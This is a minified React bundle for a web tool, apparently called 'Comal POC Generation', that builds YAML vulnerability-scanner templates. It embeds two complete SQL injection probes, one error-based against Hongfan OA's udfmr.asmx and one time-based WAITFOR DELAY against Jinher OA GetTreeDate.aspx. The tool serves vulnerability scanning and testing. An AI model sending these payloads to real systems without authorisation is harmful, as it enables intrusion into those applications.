{"code":"(window.webpackJsonp=window.webpackJsonp||[]).push([[0],{187:function(e,t,a){e.exports=a(392)},193:function(e,t,a){},392:function(e,t,a){\"use strict\";a.r(t);var n=a(1),l=a.n(n),r=a(8),s=a.n(r),o=(a(192),a(193),a(194),a(184)),i=(a(131),a(45)),c=(a(83),a(35)),p=(a(167),a(25)),u=(a(132),a(28)),d=(a(133),a(37)),h=(a(106),a(30)),m=(a(393),a(104)),y=(a(168),a(79)),f=a(66),b=(a(206),a(183)),v=a(38),E=a(49),g=a(65),O=a(60),x=a(24),C=a(64),w=(a(208),a(81)),k=a(50),H=a.n(k),j=a(128),I=a.n(j),S=a(169),T=a.n(S),P=a(170),R=a.n(P),A=(a(394),a(182)),N=(a(237),a(180)),V=(a(239),a(10)),B=function(e){function t(e){var a;return Object(v.a)(this,t),(a=Object(g.a)(this,Object(O.a)(t).call(this,e))).changeInputValue=a.changeInputValue.bind(Object(x.a)(a)),a}return Object(C.a)(t,e),Object(E.a)(t,[{key:\"changeInputValue\",value:function(e){this.props.updateHandler(this.props.header.index,e.target.name,e.target.value)}},{key:\"render\",value:function(){var e=this;return l.a.createElement(l.a.Fragment,null,l.a.createElement(h.a.Group,{compact:!0,style:{width:\"90%\"}},l.a.createElement(h.a,{style:{width:\"20%\"},name:\"key\",value:this.props.header.key,onChange:this.changeInputValue,placeholder:\"User-Agent\"}),l.a.createElement(h.a,{style:{width:\"80%\"},name:\"value\",value:this.props.header.value,onChange:this.changeInputValue,placeholder:\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36\"})),this.props.showDeleteButton?l.a.createElement(V.a,{className:\"dynamic-delete-button color-red\",type:\"minus-circle-o\",style:{color:\"#ff6868\"},onClick:function(t){return e.props.deleteHandler(e.props.header.index)}}):null,this.props.showAddButton?l.a.createElement(V.a,{className:\"dynamic-delete-button color-grey\",type:\"plus-circle-o\",onClick:this.props.addHandler}):null)}}]),t}(l.a.Component),G=0,_=function e(){Object(v.a)(this,e),this.index=++G,this.key=\"\",this.value=\"\"};function q(e,t){for(var a in e)if(e[a].index===t)return a;return-1}var z=function(e){function t(e){var a;return Object(v.a)(this,t),(a=Object(g.a)(this,Object(O.a)(t).call(this,e))).state={pathHelp:{status:\"success\",help:\"\"},headersHelp:{status:\"success\",help:\"\"}},a.changeInputValue=a.changeInputValue.bind(Object(x.a)(a)),a.changeInputValueByName=a.changeInputValueByName.bind(Object(x.a)(a)),a.addHeader=a.addHeader.bind(Object(x.a)(a)),a.updateHeader=a.updateHeader.bind(Object(x.a)(a)),a.deleteHeader=a.deleteHeader.bind(Object(x.a)(a)),a}return Object(C.a)(t,e),Object(E.a)(t,[{key:\"checkRule\",value:function(e,t){var a;if(\"path\"===e)a=t.startsWith(\"/\")?{status:\"success\",help:\"\"}:{status:\"error\",help:\"path\\u9700\\u8981\\u4ee5/\\u5f00\\u5934\"},this.setState({pathHelp:a});else if(\"headers\"===e){var n={status:\"success\",help:\"\"},l=!0,r=!1,s=void 0;try{for(var o,i=t[Symbol.iterator]();!(l=(o=i.next()).done);l=!0){o.value.key||(n={status:\"error\",help:\"HTTP\\u5934Key\\u4e0d\\u80fd\\u4e3a\\u7a7a\"})}}catch(c){r=!0,s=c}finally{try{l||null==i.return||i.return()}finally{if(r)throw s}}this.setState({headersHelp:n})}}},{key:\"changeInputValue\",value:function(e){this.checkRule(e.target.name,e.target.value),this.props.updateHandler(this.props.rule.index,e.target.name,e.target.value)}},{key:\"changeInputValueByName\",value:function(e,t){this.checkRule(e,t),this.props.updateHandler(this.props.rule.index,e,t)}},{key:\"addHeader\",value:function(){var e=H()(this.props.rule.headers,{$push:[new _]});this.changeInputValueByName(\"headers\",e)}},{key:\"updateHeader\",value:function(e,t,a){var n=q(this.props.rule.headers,e);if(n>=0){var l=H()(this.props.rule.headers,Object(f.a)({},n,Object(f.a)({},t,{$set:a})));this.changeInputValueByName(\"headers\",l)}}},{key:\"deleteHeader\",value:function(e){var t=q(this.props.rule.headers,e);if(t>=0){var a=H()(this.props.rule.headers,{$splice:[[t,1]]});this.changeInputValueByName(\"headers\",a)}}},{key:\"render\",value:function(){var e=this;return l.a.createElement(A.a,{title:\"\\u89c4\\u5219\\uff08Rule\\uff09\",size:\"small\",className:\"rule-card\",style:{marginBottom:\"24px\"},extra:l.a.createElement(c.a.Group,{size:\"small\"},l.a.createElement(c.a,{onClick:function(t){return e.props.deleteHandler(e.props.rule.index)},disabled:this.props.ruleSize<=1},\"\\u5220\\u9664Rule\"),l.a.createElement(c.a,{onClick:this.props.addHandler},\"\\u589e\\u52a0\\u4e00\\u4e2aRule\"))},l.a.createElement(d.a.Item,{label:\"\\u8bf7\\u6c42\\u65b9\\u6cd5\",className:\"rule-item\"},l.a.createElement(p.a,{defaultValue:this.props.rule.method,style:{width:120},name:\"method\",onChange:function(t){return e.changeInputValueByName(\"method\",t)}},[\"HEAD\",\"GET\",\"POST\",\"PUT\",\"PATCH\",\"DELETE\",\"CONNECT\",\"OPTIONS\",\"TRACE\"].map(function(e,t){return l.a.createElement(p.a.Option,{value:e,key:e},e)}))),l.a.createElement(d.a.Item,{label:\"\\u8bf7\\u6c42\\u8def\\u5f84\",className:\"rule-item\",validateStatus:this.state.pathHelp.status,help:this.state.pathHelp.help},l.a.createElement(h.a,{placeholder:\"/path/to/request\",type:\"text\",name:\"path\",value:this.props.rule.path,onChange:this.changeInputValue})),l.a.createElement(d.a.Item,{label:\"\\u8bf7\\u6c42\\u5934\",className:\"rule-item\",validateStatus:this.state.headersHelp.status,help:this.state.headersHelp.help},this.props.rule.headers.map(function(t,a){return l.a.createElement(B,{key:t.index,header:t,showAddButton:a===e.props.rule.headers.length-1,showDeleteButton:e.props.rule.headers.length>1,addHandler:e.addHeader,updateHandler:e.updateHeader,deleteHandler:e.deleteHeader})})),l.a.createElement(d.a.Item,{label:\"\\u8bf7\\u6c42\\u4f53\",className:\"rule-item\"},l.a.createElement(h.a.TextArea,{autosize:{minRows:2},name:\"body\",value:this.props.rule.body,onChange:this.changeInputValue})),l.a.createElement(d.a.Item,{label:\"\\u5141\\u8bb8\\u8df3\\u8f6c\",className:\"rule-item\"},l.a.createElement(N.a,{checked:this.props.rule.follow_redirects,name:\"follow_redirects\",onChange:function(t){return e.changeInputValueByName(\"follow_redirects\",t)}})),l.a.createElement(d.a.Item,{label:\"CEL\\u8868\\u8fbe\\u5f0f\",className:\"rule-item\"},l.a.createElement(h.a,{placeholder:\"responese.status==200\",type:\"text\",value:this.props.rule.expression,name:\"expression\",onChange:this.changeInputValue})),l.a.createElement(d.a.Item,{label:\"\\u63d0\\u53d6\\u89c4\\u5219\",className:\"rule-item\"},l.a.createElement(h.a,{placeholder:\"\",type:\"text\",value:this.props.rule.search,name:\"search\",onChange:this.changeInputValue})))}}]),t}(l.a.Component),M=0,D=function(){function e(){Object(v.a)(this,e),this.index=++M,this.method=\"GET\",this.path=\"\",this.headers=[new _],this.body=\"\",this.follow_redirects=!0,this.expression=\"\",this.search=\"\"}return Object(E.a)(e,[{key:\"addHeader\",value:function(){}}]),e}(),L=w.a.Header,W=w.a.Content,K=w.a.Footer,U=function(e){function t(e){var a;return Object(v.a)(this,t),(a=Object(g.a)(this,Object(O.a)(t).call(this,e))).checkyaml=function(){var e=a.state.yamlText;try{var t=I.a.load(e);console.log(\"YAML\\u683c\\u5f0f\\u6b63\\u786e:\",t)}catch(n){console.error(\"YAML\\u683c\\u5f0f\\u9519\\u8bef:\",n.message)}},a.state={name:\"poc-yaml-sql\",transport:\"http\",rules:[new D],detail:{},poc:\"\"},a.updateRule=a.updateRule.bind(Object(x.a)(a)),a.generatePOC=a.generatePOC.bind(Object(x.a)(a)),a.addRule=a.addRule.bind(Object(x.a)(a)),a.deleteRule=a.deleteRule.bind(Object(x.a)(a)),a.notify=a.notify.bind(Object(x.a)(a)),a}return Object(C.a)(t,e),Object(E.a)(t,[{key:\"componentDidMount\",value:function(){var e=this;new R.a(\"#copy-btn\").on(\"success\",function(t){e.notify(\"\\u590d\\u5236\\u6210\\u529f\",\"POC\\u5185\\u5bb9\\u5df2\\u6210\\u529f\\u590d\\u5236\\u5230\\u526a\\u5207\\u677f\")})}},{key:\"notify\",value:function(e,t){b.a.success({message:e,description:t,duration:3})}},{key:\"updateRule\",value:function(e,t,a){var n=q(this.state.rules,e);if(n>=0){var l=H()(this.state.rules,Object(f.a)({},n,Object(f.a)({},t,{$set:a})));this.setState({rules:l})}}},{key:\"deleteRule\",value:function(e){var t=q(this.state.rules,e);if(t>=0){var a=H()(this.state.rules,{$splice:[[t,1]]});this.setState({rules:a})}}},{key:\"checkyaml\",value:function(){}},{key:\"generatePOC\",value:function(){var e={name:this.state.name,transport:this.state.transport,rules:T()(this.state.rules)},t=!0,a=!1,n=void 0;try{for(var l,r=e.rules[Symbol.iterator]();!(t=(l=r.next()).done);t=!0){var s=l.value;delete s.index;var o={},i=!0,c=!1,p=void 0;try{for(var u,d=s.headers[Symbol.iterator]();!(i=(u=d.next()).done);i=!0){var h=u.value;h.key&&(o[h.key]=h.value)}}catch(E){c=!0,p=E}finally{try{i||null==d.return||d.return()}finally{if(c)throw p}}Object.keys(o).length>0?s.headers=o:delete s.headers,s.body.length||delete s.body,s.path.length||delete s.path,s.search.length||delete s.search,s.expression=\"\".concat(s.expression,\"\\n\");var m,y={};y.method=s.method,y.follow_redirects=s.follow_redirects,y.body=s.body,y.path=s.path,m=s.expression,delete s.method,delete s.follow_redirects,delete s.body,delete s.path,delete s.expression,s.request=y,s.expression=m}}catch(E){a=!0,n=E}finally{try{t||null==r.return||r.return()}finally{if(a)throw n}}var f={};e.rules.forEach(function(e,t){f[\"r\".concat(t)]=e});var b=Object.keys(f).length;var v=I.a.safeDump({name:this.state.name,transport:this.state.transport,rules:f,expression:function(e){for(var t=\"\",a=0;a<e;a++)a>0&&(t+=\"&&\"),t+=\"r\".concat(a,\"()\");return t}(b)});this.setState({poc:v,isEditable:!0})}},{key:\"addRule\",value:function(){var e=H()(this.state.rules,{$push:[new D]});this.setState({rules:e})}},{key:\"render\",value:function(){var e=this;return l.a.createElement(w.a,{className:\"layout\"},l.a.createElement(L,null,l.a.createElement(\"div\",{className:\"logo\"},l.a.createElement(\"span\",{role:\"img\",\"aria-label\":\"dna\",\"aria-hidden\":\"true\"},\"\\ud83e\\uddec\"),\" Comal POC Generation\"),l.a.createElement(y.b,{theme:\"dark\",mode:\"horizontal\",defaultSelectedKeys:[\"2\"],style:{lineHeight:\"64px\"}})),l.a.createElement(W,{style:{padding:\"0 50px\"}},l.a.createElement(m.a,{style:{margin:\"16px 0\"}},l.a.createElement(m.a.Item,null,\"\\u9996\\u9875\"),l.a.createElement(m.a.Item,null,\"POC\\u751f\\u6210\")),l.a.createElement(\"div\",{style:{background:\"#fff\",padding:24,minHeight:280}},l.a.createElement(i.a,{gutter:16,type:\"flex\"},l.a.createElement(u.a,{span:12},l.a.createElement(d.a,{layout:\"horizontal\",labelAlign:\"left\"},l.a.createElement(d.a.Item,Object.assign({label:\"POC\\u540d\"},{labelCol:{span:2},wrapperCol:{span:22}}),l.a.createElement(h.a,{placeholder:\"\\u7531\\u6570\\u5b57\\u3001\\u5b57\\u6bcd\\u3001\\u77ed\\u6a2a\\u7ebf\\u7ec4\\u6210\",type:\"text\",value:this.state.name,onChange:function(t){return e.setState({name:t.target.value})}})),this.state.rules.map(function(t,a){return l.a.createElement(z,{key:t.index,rule:t,ruleSize:e.state.rules.length,updateHandler:e.updateRule,addHandler:e.addRule,deleteHandler:e.deleteRule})}))),l.a.createElement(u.a,{span:12,style:{paddingTop:\"4px\"}},l.a.createElement(o.a,{offsetTop:8},l.a.createElement(\"div\",{style:{display:\"flex\",flexDirection:\"column\"}},l.a.createElement(\"div\",{style:{marginBottom:\"15px\"}},l.a.createElement(\"span\",{style:{fontSize:\"18px\",fontWeight:\"bold\"}},\"\\u8bf7\\u9009\\u62e9\\u53c2\\u8003\\u6a21\\u677f\"),l.a.createElement(\"br\",null),l.a.createElement(p.a,{placeholder:\"\\u9009\\u62e9\\u751f\\u6210\\u7684POC\\u5185\\u5bb9\",value:this.state.selectedPOC,style:{width:\"100%\"},onChange:function(t){return e.setState({selectedPOC:t})}},l.a.createElement(p.a.Option,{value:\"poc1\"},\"poc-yaml-sqli(echo)\"),l.a.createElement(p.a.Option,{value:\"poc2\"},\"poc-yaml-sqli(no-echo)\"),l.a.createElement(p.a.Option,{value:\"poc3\"},\"poc-yaml-xss\"),l.a.createElement(p.a.Option,{value:\"poc4\"},\"poc-yaml-lfi\"),l.a.createElement(p.a.Option,{value:\"poc5\"},\"poc-yaml-rce\"),l.a.createElement(p.a.Option,{value:\"poc6\"},\"poc-yaml-leak\"),l.a.createElement(p.a.Option,{value:\"poc7\"},\"poc-yaml-deser\"),l.a.createElement(p.a.Option,{value:\"poc8\"},\"poc-yaml-fileUpload\"),l.a.createElement(p.a.Option,{value:\"poc9\"},\"poc-yaml-httpReverse\"),l.a.createElement(p.a.Option,{value:\"poc10\"},\"poc-yaml-ldapReverse\"))),l.a.createElement(\"div\",null,l.a.createElement(h.a.TextArea,{autosize:{minRows:10},placeholder:\"\\u6839\\u636e\\u9009\\u62e9\\u751f\\u6210\\u7684POC\\u5185\\u5bb9\",value:\"poc1\"===this.state.selectedPOC?'id: VUL-2023-13362\\nname: udfmr-sqli\\ntags:\\n  - HFOffice  //\\u5bf9\\u5e94\\u7684\\u6307\\u7eb9\\u4fe1\\u606f\\ntransport: http\\nrules:\\n  req1:\\n    request:\\n      cache: false\\n      method: POST\\n      path: /iOffice/prg/set/wss/udfmr.asmx\\n      headers: \\n        Content-Type: text/xml; charset=utf-8\\n        SOAPAction: \"http://tempuri.org/ioffice/udfmr/GetEmpSearch\"\\n      body: |\\n        <?xml version=\"1.0\" encoding=\"utf-8\"?>\\n        <soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\\n          <soap:Body>\\n            <GetEmpSearch xmlns=\"http://tempuri.org/ioffice/udfmr\">\\n              <condition>1=user_name()</condition>\\n            </GetEmpSearch>\\n          </soap:Body>\\n        </soap:Envelope>\\n    expression: response.body.bcontains(b\"System.Data.SqlClient.SqlException\") && response.body.bcontains(b\"\\u8f6c\\u6362\\u6210\\u6570\\u636e\\u7c7b\\u578b int \\u65f6\\u5931\\u8d25\") //\\u6ce8\\u5165payload\\u4ea7\\u751f\\u7684\\u56de\\u663e\\u7279\\u5f81\\nexpression: req1()\\ndetail:\\n  vulnerability:\\n    proof:\\n      info: \\u5b58\\u5728\\u7ea2\\u5e06OA udfmr.asmx SQL\\u6ce8\\u5165':\"poc2\"===this.state.selectedPOC?\"id: VUL-2023-10012\\nname: jinher-oa_gettreedate_sqli\\ntags:\\n    - JINHER-OA //\\u6307\\u7eb9\\ntransport: http\\nset: null\\nrules:\\n    r1:\\n        request:\\n            method: GET\\n            path: /C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1%3bWAITFOR+DELAY+%270%3a0%3a3%27+--%20and%201=1\\n            headers:\\n                Connection: close\\n                User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15\\n                Content-Type: application/x-www-form-urlencoded\\n        expression:  response.status == 200 && (response.latency > 3000) && response.body.bcontains(b'id') && response.body.bcontains(b'text') && response.body.bcontains(b'permissions') && response.body.bcontains(b'GetTreeDate.aspx?nodeid') \\n        // \\u7528response.latency > 3000\\u6765\\u5224\\u65ad\\u8fd4\\u56de\\u5305\\u5ef6\\u65f6\\u5927\\u4e8e3000ms\\uff0c\\u65e0\\u56de\\u663e\\u7684\\u60c5\\u51b5\\u4e0b\\u4f7f\\u7528\\u5ef6\\u65f6\\n    r2:\\n        request:\\n            method: GET\\n            path:  /C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1%3bWAITFOR+DELAY+%270%3a0%3a5%27+--%20and%201=1\\n            headers:\\n                Connection: close\\n                User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15\\n                Content-Type: application/x-www-form-urlencoded\\n        expression:  response.status == 200 && (response.latency  > 5000) && response.body.bcontains(b'id') && response.body.bcontains(b'text') && response.body.bcontains(b'permissions') && response.body.bcontains(b'GetTreeDate.aspx?nodeid')     \\nexpression: r1() && r2() //\\u53d1\\u9001\\u591a\\u6b21\\u8bf7\\u6c42\\uff0c\\u4e14\\u5fc5\\u987b\\u540c\\u65f6\\u6ee1\\u8db3\\ndetail:\\n    vulnerability:\\n        proof:\\n            info: \\u5b58\\u5728 jinher-oa_gettreedate_sqli \\u6f0f\\u6d1e\":\"poc3\"===this.state.selectedPOC?\"poc3\\u7684\\u5185\\u5bb9\":\"poc4\"===this.state.selectedPOC?\"poc4\\u7684\\u5185\\u5bb9\":\"poc5\"===this.state.selectedPOC?\"poc5\\u7684\\u5185\\u5bb9\":\"poc6\"===this.state.selectedPOC?\"poc6\\u7684\\u5185\\u5bb9\":\"\",readOnly:!0})),l.a.createElement(\"span\",{style:{fontSize:\"18px\",fontWeight:\"bold\"}},\"\\u751f\\u6210\\u7684poc\"),l.a.createElement(\"div\",null,l.a.createElement(h.a.TextArea,{autosize:{minRows:10},placeholder:\"\\u751f\\u6210POC\\u5185\\u5bb9\",value:this.state.poc,id:\"poc-detail\",readOnly:!this.state.isEditable,onChange:function(t){return e.setState({poc:t.target.value})}})),l.a.createElement(i.a,{justify:\"end\",type:\"flex\"},l.a.createElement(c.a,{type:\"primary\",size:\"default\",onClick:this.generatePOC,className:\"br\"},\"\\u751f\\u6210\"),l.a.createElement(c.a,{type:\"dashed\",icon:\"copy\",id:\"copy-btn\",\"data-clipboard-text\":this.state.poc},\"\\u590d\\u5236POC\")))))))),l.a.createElement(K,{style:{textAlign:\"center\"}},\"\\xa92023 Comal POC Generation\"))}}]),t}(l.a.Component);Boolean(\"localhost\"===window.location.hostname||\"[::1]\"===window.location.hostname||window.location.hostname.match(/^127(?:\\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}$/));s.a.render(l.a.createElement(U,null),document.getElementById(\"root\")),\"serviceWorker\"in navigator&&navigator.serviceWorker.ready.then(function(e){e.unregister()})}},[[187,1,2]]]);","extractedComments":[]}